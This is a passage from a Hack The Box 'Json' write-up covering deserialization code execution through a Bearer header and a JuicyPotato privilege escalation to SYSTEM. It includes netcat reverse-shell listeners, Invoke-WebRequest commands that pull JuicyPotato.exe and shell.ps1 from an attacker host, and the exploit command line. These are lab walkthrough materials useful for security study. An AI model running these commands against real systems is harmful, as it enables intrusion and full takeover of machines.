<p><a href="/assets/img/writeups/hackthebox/machines/json/json.htb_ysoserial-net.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/json/json.htb_ysoserial-net.png" alt="Json Payload Screenshot" class="img-fluid" /></a></p>

<p>Now let’s setup our listener:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-nlvp</span> 1234</code></pre></figure>

<p>Then using <em>Burp Suite</em> we <code class="highlighter-rouge">intercept</code> the login and then step <code class="highlighter-rouge">forward</code> until we see our <code class="highlighter-rouge">GET</code> call to <code class="highlighter-rouge">/api/Account</code>. We will then right click and select <code class="highlighter-rouge">Send to Repeater</code> (just incase we lose connection). In our <code class="highlighter-rouge">Repeater</code> tab we add our payload in the <code class="highlighter-rouge">Bearer:</code> section of the header and send it to the server:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/json/json.htb_user.gif" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/json/json.htb_user.gif" alt="Json User Exploit Screenshot" class="img-fluid" /></a></p>

<p>Back at our listener we should see a connection:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-nlvp</span> 1234
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.158.
Ncat: Connection from 10.10.10.158:52007.

PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">whoami           
</span>json<span class="se">\u</span>serpool
PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">cat </span>C:<span class="se">\U</span>sers<span class="se">\u</span>serpool<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
34459a01f5....9bfb9f52bb</code></pre></figure>

<p>NOT: If you don’t see a command prompt hit <code class="highlighter-rouge">ENTER</code>.</p>

<p>Just like that we have the <code class="highlighter-rouge">user.txt</code> flag. Now onward to <code class="highlighter-rouge">root</code>!</p>

<h2 id="root">Root</h2>

<p>Let’s check out what permissions we have:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">whoami</span> /priv                                               

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State   
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled </code></pre></figure>

<p>We see that <code class="highlighter-rouge">SeImpersonatePrivilege</code> is enabled so we should be able to use the <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> exploit.</p>

<p>To get the file on to the machine we start up our webserver on the <code class="highlighter-rouge">attacker</code> machine to serve the file:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python3 <span class="nt">-m</span> http.server 80</code></pre></figure>

<p>Then download from the <code class="highlighter-rouge">victim</code> machine:</p>

<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">Invoke-WebRequest</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attacker-ip</span><span class="err">&gt;</span><span class="nx">/JuicyPotato.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">C:\Windows\Temp\jp.exe</span></code></pre></figure>

<p>We will use a <em>PowerShell</em> reverse shell again so we download that as well:</p>

<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">Invoke-WebRequest</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attacker-ip</span><span class="err">&gt;</span><span class="nx">/shell.ps1</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">C:\Windows\Temp\shell.ps1</span></code></pre></figure>

<p>Once again we setup our listener on the <code class="highlighter-rouge">attacker</code> machine:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-nlvp</span> 6666</code></pre></figure>

<p>And then launch our exploit:</p>

<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s1">'.\jp.exe -l 9999 -p c:\Windows\System32\cmd.exe -a "/c powershell C:\Windows\Temp\shell.ps1" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}'</span></code></pre></figure>

<p>Back at our listener on the <code class="highlighter-rouge">attacker</code> machine we should receive a connection:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-nlvp</span> 6666
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 10.10.10.158.
Ncat: Connection from 10.10.10.158:54779.
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cat </span>C:<span class="se">\U</span>sers<span class="se">\s</span>uperadmin<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
3cc85d1bed....01b991d441</code></pre></figure>

<h2 id="conclusion">Conclusion</h2>

<p>Overall this machine was quite fun. It was straight forward and practical considering the misuse of <em>JSON</em> within the realms of website authentication. There have been many examples of this exploit being used in the wild against insecure authentication APIs.</p>
<!-- Hack The Box Badge -->
          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
      </div>
    </div>
    <!-- Bootstrap core JavaScript -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="/assets/js/bootstrap.bundle.min.js"></script>
    <!-- Custom JavaScript -->
    <script src="/assets/js/sabe.js"></script>
    <!-- Lightbox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
    <script>
      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
        event.preventDefault();
        $(this).ekkoLightbox();
      });
    </script>
  </body>
</html>